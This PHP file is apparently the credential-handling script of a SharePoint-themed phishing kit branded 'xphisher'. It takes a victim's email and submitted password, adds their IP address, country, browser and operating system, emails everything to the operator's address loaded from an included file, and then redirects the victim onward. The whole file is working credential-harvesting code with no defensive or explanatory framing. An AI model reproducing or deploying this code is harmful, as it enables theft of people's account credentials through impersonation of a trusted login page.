<?php
/*
========================= oneprosec.com ===========================
*/
session_start();
if (strlen($_POST['p'])<6) {
	exit();
}
$Email    = $_SESSION['e'] = $_SESSION['e'];
$Password = $_SESSION['p'] = $_POST['p'];
$TIME_DATE = date('H:i:s d/m/Y');
$auth = $_SESSION ['authenticator'] = $_SESSION['authenticator'];
include('../Your_email.php');
include('../BOTS/get_browser.php');
include('../BOTS/get_ip.php');
$X_MESSAGE = '

[ Email ] = '.$Email.'<br/>
[ Password ] = '.$Password.'<br/>
[ Ip Address ] = '.$_COOKIE['ip11'].'<br/>
[ Country ] = '.$LOOKUP_COUNTRY.'<br/>
[ Browser ] = '.X_Browser($_SERVER['HTTP_USER_AGENT'])." On ".X_OS($_SERVER['HTTP_USER_AGENT']).'<br/>
[ Time/Date ] = '.$TIME_DATE.'<br/>

© 2019 xphisher.com';

$X_SUBJECT = "Sharepoint v5 | ".$Email."  | ".$LOOKUP_COUNTRY;
$X_HEADERS = "From:Wolf-updated<Xphisher>\n";
$X_HEADERS .= "MIME-Version: 1.0\n";
$X_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
mail($Your_Email, $X_SUBJECT, $X_MESSAGE, $X_HEADERS);
HEADER("Location: ../le/".$auth, true, 303);
?>
